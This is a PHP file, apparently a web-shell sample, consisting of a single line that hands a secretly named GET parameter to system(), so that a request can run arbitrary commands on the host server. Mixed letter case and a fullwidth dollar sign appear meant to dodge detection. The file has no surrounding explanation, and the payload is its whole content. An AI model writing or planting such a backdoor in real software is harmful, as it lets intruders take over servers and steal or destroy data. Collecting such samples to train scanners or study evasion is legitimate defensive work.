<?php
SysTeM(＄_GET['o9v6EWY9']);
?>
